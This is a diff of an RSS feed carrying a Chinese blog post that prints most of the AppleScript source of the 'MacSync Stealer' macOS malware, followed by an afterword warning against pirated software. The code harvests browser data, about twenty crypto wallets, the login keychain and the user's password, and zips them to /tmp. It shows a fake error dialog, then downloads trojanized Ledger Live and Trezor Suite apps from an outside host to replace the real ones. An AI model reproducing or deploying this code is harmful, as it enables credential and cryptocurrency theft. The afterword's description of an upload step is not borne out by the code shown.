+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome Canary&#34;, library &amp; &#34;Google/Chrome Canary&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chromium&#34;, library &amp; &#34;Chromium/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Chrome Dev&#34;, library &amp; &#34;Google/Chrome Dev/&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Arc&#34;, library &amp; &#34;Arc/User Data&#34;}}**
+
+**set chromiumMap to chromiumMap &amp; {{&#34;Coccoc&#34;, library &amp; &#34;CocCoc/Browser/&#34;}}**
+
+  
+
+**set walletMap to {}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Exodus&#34;, library &amp; &#34;Exodus/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Electrum&#34;, profile &amp; &#34;/.electrum/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Atomic&#34;, library &amp; &#34;Atomic Wallet/Local Storage/leveldb/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Guarda&#34;, library &amp; &#34;Guarda/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Coinomi&#34;, library &amp; &#34;Coinomi/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Sparrow&#34;, profile &amp; &#34;/.sparrow/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Wasabi&#34;, profile &amp; &#34;/.walletwasabi/client/Wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Bitcoin_Core&#34;, library &amp; &#34;Bitcoin/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Armory&#34;, library &amp; &#34;Armory/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Electron_Cash&#34;, profile &amp; &#34;/.electron-cash/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Monero&#34;, profile &amp; &#34;/.bitmonero/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Litecoin_Core&#34;, library &amp; &#34;Litecoin/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Dash_Core&#34;, library &amp; &#34;DashCore/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Dogecoin_Core&#34;, library &amp; &#34;Dogecoin/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Electrum_LTC&#34;, profile &amp; &#34;/.electrum-ltc/wallets/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/BlueWallet&#34;, library &amp; &#34;BlueWallet/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Zengo&#34;, library &amp; &#34;Zengo/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Trust&#34;, library &amp; &#34;Trust Wallet/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Ledger Live&#34;, library &amp; &#34;Ledger Live/&#34;}}**
+
+**set walletMap to walletMap &amp; {{&#34;Wallets/Desktop/Trezor Suite&#34;, library &amp; &#34;@trezor&#34;}}**
+
+  
+
+**readwrite(library &amp; &#34;Binance/&#34;, writemind &amp; &#34;Wallets/Desktop/Binance/&#34;)**
+
+**readwrite(library &amp; &#34;TON Keeper/&#34;, writemind &amp; &#34;Wallets/Desktop/TonKeeper/&#34;)**
+
+**readwrite(profile &amp; &#34;/Library/Keychains/login.keychain-db&#34;, writemind &amp; &#34;login.keychain-db&#34;)**
+
+  
+
+**writeText(username, writemind &amp; &#34;Username&#34;)**
+
+**writeText(&#34;1.0.8_release (x64_86 &amp; ARM)&#34;, writemind &amp; &#34;Version&#34;)**
+
+  
+
+**try**
+
+**writeText(&#34;MacSync Stealer\n\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;Build Tag: kis\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;Version: 1.0.8_release (x64_86 &amp; ARM)\n\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;Username: &#34; &amp; username, writemind &amp; &#34;info&#34;)**
+
+**writeText(&#34;\nPassword: &#34; &amp; password_entered &amp; &#34;\n\n&#34;, writemind &amp; &#34;info&#34;)**
+
+**set result to (do shell script &#34;system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType&#34;)**
+
+**writeText(result, writemind &amp; &#34;info&#34;)**
+
+**end try**
+
+  
+
+**filegrabber(writemind)**
+
+  
+
+**Chromium(writemind, chromiumMap)**
+
+**ChromiumWallets(writemind, chromiumMap)**
+
+**DesktopWallets(writemind, walletMap)**
+
+**Telegram(writemind, library)**
+
+**Notes(writemind)**
+
+  
+
+  
+
+**do shell script &#34;ditto -c -k --sequesterRsrc &#34; &amp; writemind &amp; &#34; /tmp/osalogging.zip&#34;**
+
+**display dialog &#34;Your Mac does not support this application. Try reinstalling or downloading the version for your system.&#34; with title &#34;System Preferences&#34; with icon stop buttons {&#34;ОК&#34;}**
+
+  
+
+  
+
+**set LEDGERURL to &#34;https://nhaxuong.com/ledger/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;**
+
+**set LEDGERDMGPATH to &#34;/tmp/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00.zip&#34;**
+
+**set LEDGERMOUNT to &#34;/tmp&#34;**
+
+**set LEDGERNAME to &#34;Ledger Live.app&#34;**
+
+**set LEDGERPATH to LEDGERMOUNT &amp; &#34;/&#34; &amp; LEDGERNAME**
+
+**set LEDGERAPPFOLDER to &#34;/Applications&#34;**
+
+**set LEDGERDEST to LEDGERAPPFOLDER &amp; &#34;/&#34; &amp; LEDGERNAME**
+
+  
+
+**try**
+
+    **do shell script &#34;test -d &#34; &amp; quoted form of LEDGERDEST**
+
+    **set ledger_installed to true**
+
+**on error**
+
+    **set ledger_installed to false**
+
+**end try**
+
+  
+
+**if ledger_installed then**
+
+    **try**
+
+        **do shell script &#34;curl -k --user-agent &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#39; -H &#39;api-key: 5190ef1733183a0dc63fb623357f56d6&#39; -L &#34; &amp; quoted form of LEDGERURL &amp; &#34; -o &#34; &amp; quoted form of LEDGERDMGPATH**
+
+        **do shell script &#34;unzip -q -o &#34; &amp; quoted form of LEDGERDMGPATH &amp; &#34; -d &#34; &amp; quoted form of LEDGERMOUNT**
+
+        **set app_exists to false**
+
+        **try**
+
+            **do shell script &#34;test -e &#34; &amp; quoted form of LEDGERPATH**
+
+            **set app_exists to true**
+
+        **end try**
+
+        **if app_exists then**
+
+            **try**
+
+                **do shell script &#34;killall -9 &#39;Ledger Live&#39;&#34;**
+
+            **end try**
+
+            **do shell script &#34;rm -rf &#34; &amp; quoted form of LEDGERDEST**
+
+            **do shell script &#34;cp -R &#34; &amp; quoted form of LEDGERPATH &amp; &#34; &#34; &amp; quoted form of LEDGERAPPFOLDER**
+
+        **end if**
+
+    **end try**
+
+  
+
+    **try**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of LEDGERDMGPATH**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of LEDGERPATH**
+
+    **end try**
+
+**end if**
+
+  
+
+**set TREZORURL to &#34;https://nhaxuong.com/trezor/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;**
+
+**set TREZORDMGPATH to &#34;/tmp/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00.zip&#34;**
+
+**set TREZORMOUNT to &#34;/tmp&#34;**
+
+**set TREZORNAME to &#34;Trezor Suite.app&#34;**
+
+**set TREZORPATH to TREZORMOUNT &amp; &#34;/&#34; &amp; TREZORNAME**
+
+**set TREZORAPPFOLDER to &#34;/Applications&#34;**
+
+**set TREZORDEST to TREZORAPPFOLDER &amp; &#34;/&#34; &amp; TREZORNAME**
+
+  
+
+**try**
+
+    **do shell script &#34;test -d &#34; &amp; quoted form of TREZORDEST**
+
+    **set trezor_installed to true**
+
+**on error**
+
+    **set trezor_installed to false**
+
+**end try**
+
+  
+
+**if trezor_installed then**
+
+    **try**
+
+        **do shell script &#34;curl -k --user-agent &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#39; -H &#39;api-key: 5190ef1733183a0dc63fb623357f56d6&#39; -L &#34; &amp; quoted form of TREZORURL &amp; &#34; -o &#34; &amp; quoted form of TREZORDMGPATH**
+
+        **do shell script &#34;unzip -q -o &#34; &amp; quoted form of TREZORDMGPATH &amp; &#34; -d &#34; &amp; quoted form of TREZORMOUNT**
+
+        **set app_exists to false**
+
+        **try**
+
+            **do shell script &#34;test -e &#34; &amp; quoted form of TREZORPATH**
+
+            **set app_exists to true**
+
+        **end try**
+
+        **if app_exists then**
+
+            **try**
+
+                **do shell script &#34;killall -9 &#39;Trezor Suite&#39;&#34;**
+
+            **end try**
+
+            **do shell script &#34;rm -rf &#34; &amp; quoted form of TREZORDEST**
+
+            **do shell script &#34;cp -R &#34; &amp; quoted form of TREZORPATH &amp; &#34; &#34; &amp; quoted form of TREZORAPPFOLDER**
+
+        **end if**
+
+    **end try**
+
+  
+
+    **try**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of TREZORDMGPATH**
+
+        **do shell script &#34;rm -rf &#34; &amp; quoted form of TREZORPATH**
+
+    **end try**
+
+**end if**
+</code></pre><h2 id="后记">后记</h2>
+<p>借助GPT的分析你会发现这是一段后门程序，执行完成之后会主动退出terminal然后将所有的输入输出以及错误重定向到/dev/null（黑洞）的位置，至此你是无感执行的，最后这段程序大概含义就是盗取你的比特币钱包替换为对方的，然后提取你电脑的重要信息打包到一个临时目录中最后再上传到对方的服务器当中，整个过程相当丝滑，现在想想之前的盗版软件下载了一大堆，那个时候电脑莫名发热很可能就是用来当肉鸡挖矿或者任由对方摆布了&hellip;，能支持正版还是尽量支持正版吧，看到linuxdo上面的安全大佬也给过提醒：绝大部分的盗版软件都是有后门的，能正版就尽量支持正版吧。</p>
+]]></content:encoded>
     </item>
   </channel>
 </rss>
